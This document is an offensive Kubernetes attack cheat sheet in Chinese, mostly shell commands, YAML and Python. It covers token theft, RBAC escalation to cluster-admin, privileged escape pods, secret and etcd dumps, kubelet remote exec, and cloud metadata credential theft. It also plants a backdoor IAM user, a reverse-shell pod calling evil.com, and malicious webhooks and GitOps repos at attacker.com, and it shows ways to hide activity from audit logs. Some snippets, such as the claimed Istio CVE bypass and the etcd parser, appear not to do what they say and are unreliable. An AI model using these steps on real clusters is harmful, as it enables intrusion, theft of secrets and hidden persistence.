# Kubernetes 攻击 (K8s Attacks)

## 原理

Kubernetes 是容器编排系统，攻击者通过配置错误、RBAC 权限过大、Service Account token 泄露等获取集群控制权。

## 攻击链

### 1. 信息收集

```bash
# 检查 K8s 环境
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 检查 kubectl
which kubectl
kubectl version
kubectl config view

# 检查环境变量
env | grep KUBERNETES

# API Server 地址
# 通常在 KUBERNETES_SERVICE_HOST 环境变量中
echo $KUBERNETES_SERVICE_HOST
echo $KUBERNETES_SERVICE_PORT
```

### 2. 访问 API Server

```bash
# 使用 Service Account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# 列出 Pod
curl -s -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# 列出所有 namespace
curl -s -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# 列出 secrets
curl -s -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/secrets

# 使用 kubectl
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify get pods
```

### 3. RBAC 权限提升

```bash
# 检查当前权限
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i exec pods

# 常见危险权限
# 1. create pods: 可以创建特权 Pod 逃逸
# 2. get secrets: 可以读取所有 secrets
# 3. exec pods: 可以在任意 Pod 中执行命令
# 4. create clusterrolebindings: 可以绑定管理员角色
```

### 4. 创建特权 Pod 逃逸

```yaml
# 创建特权 Pod，挂载宿主机根目录
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "chroot /host /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

```bash
# 应用 YAML
kubectl apply -f escape-pod.yaml

# 进入 Pod
kubectl exec -it escape-pod -- /bin/sh
```

### 5. 读取 Secrets

```bash
# 列出所有 secrets
kubectl get secrets --all-namespaces

# 读取 secret
kubectl get secret <secret-name> -o yaml

# 解码
echo <base64-encoded-data> | base64 -d
```

### 6. 横向移动

```bash
# 列出所有 Pod
kubectl get pods --all-namespaces

# 在其他 Pod 中执行命令
kubectl exec -it <pod-name> -n <namespace> -- /bin/bash

# 端口转发
kubectl port-forward pod/<pod-name> 8080:80

# 复制文件
kubectl cp <pod-name>:/path/to/file /local/path
```

### 7. 持久化

```bash
# 创建后门 Pod
kubectl run backdoor --image=alpine --restart=Always --command -- /bin/sh -c "while true; do nc -e /bin/sh evil.com 4444; sleep 60; done"

# 创建恶意 Service
kubectl create service clusterip backdoor --tcp=8080:8080

# 创建恶意 Deployment
kubectl create deployment backdoor --image=alpine
```

### 8. 攻击 etcd

```bash
# 如果能访问 etcd
# etcd 存储 K8s 所有数据
# 包括 secrets

# 列出 keys
etcdctl --endpoints=https://etcd:2379 get / --prefix --keys-only

# 读取 secret
etcdctl --endpoints=https://etcd:2379 get /registry/secrets/default/secret-name
```

### 9. 攻击 kubelet

```bash
# kubelet 端口 10250
# 如果未授权访问
curl -k https://node:10250/pods

# 在 Pod 中执行命令
curl -k -XPOST "https://node:10250/run/<namespace>/<pod>/<container>" -d "cmd=id"
```

### 10. 攻击 Dashboard

```bash
# Kubernetes Dashboard
# 如果未授权访问
# 可以通过 Dashboard 创建特权 Pod
```

## 2024-2026 新技术点

### 1. Admission Controller 注入攻击

```yaml
# MutatingWebhookConfiguration 恶意注入
# 当集群中存在可写的 Admission Controller 时，可注入恶意 sidecar

# 创建恶意 Mutating Webhook — 自动给所有 Pod 注入特权容器
cat << 'YAML' > backdoor-webhook.yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: auto-escape
webhooks:
- name: auto-escape.example.com
  sideEffects: None
  admissionReviewVersions: ["v1"]
  clientConfig:
    service:
      name: webhook-svc
      namespace: default
      path: "/mutate"
    # 攻击者控制的 webhook 服务器
    url: "https://attacker.com:8443/mutate"
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: ["*"]
    apiVersions: ["v1"]
    resources: ["pods"]
  failurePolicy: Ignore
YAML

# 绕过 ValidatingWebhookConfiguration
# 方法 1：修改 failurePolicy 为 Ignore
# 方法 2：通过 API 直接操作（跳过 webhook）
kubectl patch validatingwebhookconfigurations <name> \
  --type='json' \
  -p='[{"op": "replace", "path": "/webhooks/0/failurePolicy", "value": "Ignore"}]'
```

### 2. K8s Operator CRD 提权

```bash
# Operator 使用 CRD 自定义资源，可能包含过度权限
# 通过创建恶意 CR 触发 Operator 执行特权操作

# 列出所有 CRD 和关联的 Operator
kubectl get crd -o wide
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.subjects[0].kind=="ServiceAccount") | {name:.metadata.name, sa:.subjects[0].name}'

# 查找 Operator 使用的 ServiceAccount
kubectl get deployments --all-namespaces -o json | \
  jq '.items[] | select(.spec.template.spec.serviceAccountName != "default") | {ns:.metadata.namespace, deploy:.metadata.name, sa:.spec.template.spec.serviceAccountName}'

# 列出 Operator 有权限的操作
kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>

# 利用 ArgoCD Repository Credential 泄露
# ArgoCD 在 repo secret 中存储 git 凭证
kubectl get secrets -n argocd -o json | \
  jq '.items[] | select(.type=="kubernetes.io/basic-auth") | {name:.metadata.name, data:.data}'

# Flux 恒等泄露
kubectl get gitrepository -A -o json | \
  jq '.items[] | {name:.metadata.name, url:.spec.url, secretRef:.spec.secretRef}'
```

### 3. Service Mesh 攻击 (Istio CVE-2024-23322/23323)

```bash
# CVE-2024-23322: Istio DoS（特制 HTTP/2 帧）
# CVE-2024-23323: Istio 认证绕过（host header 匹配缺陷）

# 检测 Istio 版本
istioctl version --remote
kubectl get pods -n istio-system -o jsonpath='{.items[*].spec.containers[*].image}'

# 利用 CVE-2024-23323 绕过 Istio AuthorizationPolicy
# 通过 Host header 注入绕过虚拟服务路由
python3 << 'PYEOF'
import requests

# 构造绕过 Istio mTLS 认证的请求
# 利用 x-forwarded-host header 注入
headers = {
    "Host": "admin-service.internal",
    "x-forwarded-host": "admin-service.internal",
    "x-envoy-original-path": "/admin/api/secrets",
}

# 尝试直接访问 sidecar 管理端口
# Istio sidecar 默认监听 15006 (inbound), 15001 (outbound)
# Envoy admin 端口 15000
targets = [
    "http://target-pod:15000/config_dump",
    "http://target-pod:15000/stats",
    "http://target-pod:15000/server_info",
]
for url in targets:
    try:
        r = requests.get(url, timeout=3)
        if r.status_code == 200:
            print(f"[+] {url} 可访问")
    except Exception as e:
        print(f"[-] {url} 不可达: {e}")
PYEOF
```

### 4. K8s RBAC 提权到 Cluster-admin

```bash
# 检查当前 ServiceAccount 权限
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl auth can-i --list --token=$TOKEN 2>/dev/null

# 提权路径 1: create clusterrolebinding
if kubectl auth can-i create clusterrolebindings 2>/dev/null; then
    echo "[+] 可以创建 clusterrolebinding"
    kubectl create clusterrolebinding privesc \
        --clusterrole=cluster-admin \
        --serviceaccount=default:$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
fi

# 提权路径 2: 通过 impersonate
if kubectl auth can-i impersonate groups 2>/dev/null; then
    kubectl auth can-i --list --as=system:serviceaccount:kube-system:default
fi

# 提权路径 3: 通过 secret 泄露
# 如果有 list secrets 权限
kubectl get secrets --all-namespaces -o json | \
  jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") |
  "\(.metadata.namespace)/\(.metadata.name): \(.data.token[:20])..."'

# 提权路径 4: exec 到特权 Pod
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] |
  select(.spec.containers[].securityContext.privileged==true) |
  "\(.metadata.namespace)/\(.metadata.name)"'
```

### 5. GitOps 供应链攻击 (ArgoCD/Flux)

```bash
# ArgoCD 默认密码: admin/<pod-name>
ARGOCD_POD=$(kubectl get pods -n argocd -l app.kubernetes.io/name=argocd-server -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n argocd $ARGOCD_POD -c argocd-server -- \
  argocd account update-password --account admin --new-password 'P@ssw0rd'

# ArgoCD Application YAML 可被修改指向恶意仓库
kubectl get applications -A -o json | \
  jq '.items[] | {
    name: .metadata.name,
    repo: .spec.source.repoURL,
    path: .spec.source.path
  }'

# 篡改 ArgoCD repo credentials
cat << 'YAML' > stolen-repo.yaml
apiVersion: v1
kind: Secret
metadata:
  name: repo-backdoor
  namespace: argocd
  labels:
    argocd.argoproj.io/secret-type: repository
stringData:
  url: "https://attacker.com/evil-repo.git"
  username: "git"
  password: "${STOLEN_TOKEN}"
YAML

# Flux v2 — 篡改 Kustomization 指向恶意源
cat << 'YAML' > flux-backdoor.yaml
apiVersion: kustomize.toolkit.fluxcd.io/v1
kind: Kustomization
metadata:
  name: backdoor
  namespace: flux-system
spec:
  interval: 1m
  path: "./malicious-manifests"
  sourceRef:
    kind: GitRepository
    name: attacker-repo
  prune: false
YAML
```

### 6. K8s 元数据服务利用 (IMDSv2 绑定)

```bash
# 在 AWS EKS/GKE/AKS 中，实例元数据服务与容器网络相连

# 从 Pod 中获取 EC2 实例 IAM 凭证
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GKE — 获取 GCE 服务账号 token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# AKS — 获取 Managed Identity token
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 使用泄露的凭证横向移动
python3 << 'PYEOF'
import boto3, json, requests

# EKS: 使用实例角色创建新用户
TOKEN = requests.put(
    "http://169.254.169.254/latest/api/token",
    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
).text
creds = requests.get(
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    headers={"X-aws-ec2-metadata-token": TOKEN}
).json()

session = boto3.Session(
    aws_access_key_id=creds['AccessKeyId'],
    aws_secret_access_key=creds['SecretAccessKey'],
    aws_session_token=creds['Token']
)

# 枚举权限
iam = session.client('iam')
try:
    policies = iam.list_attached_user_policies(UserName='target').get('AttachedPolicies', [])
    print(f"[+] 发现 {len(policies)} 个附加策略")
except Exception as e:
    print(f"[-] 无法枚举策略: {e}")

# 尝试创建后门用户
try:
    iam.create_user(UserName='backdoor')
    iam.create_access_key(UserName='backdoor')
    print("[+] 成功创建后门用户")
except Exception as e:
    print(f"[-] 创建用户失败: {e}")
PYEOF
```

### 7. Kubernetes Dashboard 攻击

```bash
# Dashboard 默认 Token 可能权限过大
# 获取 Dashboard ServiceAccount Token
DASH_SA=$(kubectl get sa -n kubernetes-dashboard -o jsonpath='{.items[0].metadata.name}')
TOKEN=$(kubectl create token $DASH_SA -n kubernetes-dashboard --duration=87600h)

# 使用 Token 访问 Dashboard API
kubectl get secrets -n kubernetes-dashboard -o json | \
  jq '.items[] | select(.type=="kubernetes.io/service-account-token")'

# 利用 Dashboard 的 exec 功能（需要 RBAC 权限）
# 如果 ServiceAccount 有 exec 权限
kubectl --token=$TOKEN get pods --all-namespaces
kubectl --token=$TOKEN exec -it <pod> -n <ns> -- /bin/sh

# Pod Security Standards 绕过
# 旧版 PodSecurityPolicy 已弃用，但仍有集群在使用
kubectl get podsecuritypolicies
# 如果可以修改 PSP，添加 privileged: true
kubectl patch psp privileged -p '{"spec":{"privileged":true}}'
```

### 8. Node 隐写 (K8s 审计日志隐藏)

```bash
# 在 K8s 中隐藏活动痕迹

# 使用 audit log policy 隐藏操作
# 创建不记录特定操作的 AuditPolicy
cat << 'YAML' > audit-policy-hide.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
# 不记录某些用户/ServiceAccount 的活动
- level: None
  users: ["system:serviceaccount:default:backdoor"]
  resources:
  - group: ""
    resources: ["secrets", "pods"]
# 不记录 exec 操作
- level: None
  verbs: ["create"]
  resources:
  - group: ""
    resources: ["pods/exec"]
YAML

# 通过 ephemeral containers 执行（不创建新 Pod）
kubectl debug -it <pod> --image=alpine --target=<container> -- /bin/sh
# ephemeral container 不会出现在 pod spec 中（只在 status 中）

# 使用 Kubernetes API 的 watch 绕过审计
# watch 不会触发 audit event
kubectl get pods --watch-only -A &
```

### 9. etcd 数据库直接访问

```bash
# 如果可以访问 etcd，可以直接读取所有 K8s 数据

# 检查 etcd 是否暴露
ETCD_ENDPOINT="https://etcd:2379"
ETCD_CERT="/etc/kubernetes/pki/etcd/peer.crt"
ETCD_KEY="/etc/kubernetes/pki/etcd/peer.key"
ETCD_CA="/etc/kubernetes/pki/etcd/ca.crt"

# 使用 etcdctl
etcdctl --endpoints=$ETCD_ENDPOINT \
  --cert=$ETCD_CERT --key=$ETCD_KEY --cacert=$ETCD_CA \
  get / --prefix --keys-only | head -50

# 导出所有 secrets
etcdctl --endpoints=$ETCD_ENDPOINT \
  --cert=$ETCD_CERT --key=$ETCD_KEY --cacert=$ETCD_CA \
  get /registry/secrets --prefix | \
  python3 -c "
import sys, base64, json
for line in sys.stdin.buffer:
    if b'/registry/secrets/' in line:
        try:
            data = json.loads(line)
            print(f'Namespace: {data.get(\"namespace\", \"unknown\")}')
            print(f'Name: {data.get(\"metadata\", {}).get(\"name\", \"unknown\")}')
        except Exception:
            continue
"

# 使用 kubelet 读取 Pod 中挂载的 etcd 证书并访问 etcd
curl -sk https://localhost:10250/run/<ns>/<pod>/<container> \
  -d "cmd=etcdctl --endpoints=https://etcd:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/peer.crt --key=/etc/kubernetes/pki/etcd/peer.key get / --prefix --keys-only"
```

### 10. Node 级别容器逃逸组合拳

```bash
# 通过 K8s 创建特权容器 + nsenter 进入宿主机

# Step 1: 创建特权 Pod
cat << 'YAML' > kube-escape.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-node
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: alpine
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c", "sleep infinity"]
    volumeMounts:
    - name: host-fs
      mountPath: /host
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: host-fs
    hostPath:
      path: /
      type: Directory
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
YAML

# Step 2: 应用并进入
kubectl apply -f kube-escape.yaml
kubectl exec -it escape-node -- /bin/sh

# Step 3: 在 Pod 中访问宿主机
chroot /host /bin/bash
# 或通过 docker.sock 逃逸
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```

## 工具推荐

- **kubectl** — K8s CLI
- **kube-hunter** — K8s 漏洞扫描
- **Peirates** — K8s 渗透
- **kubeaudit** — K8s 审计
- **cdk** — 容器/K8s 渗透
- **kubescape** — K8s 安全
- **KubiScan** — K8s RBAC 扫描

## 参考链接

- [Kubernetes Attack](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes)
- [Peirates](https://github.com/inguardians/peirates)
- [kube-hunter](https://github.com/aquasecurity/kube-hunter)
- [Kubernetes Security](https://kubernetes.io/docs/concepts/security/)
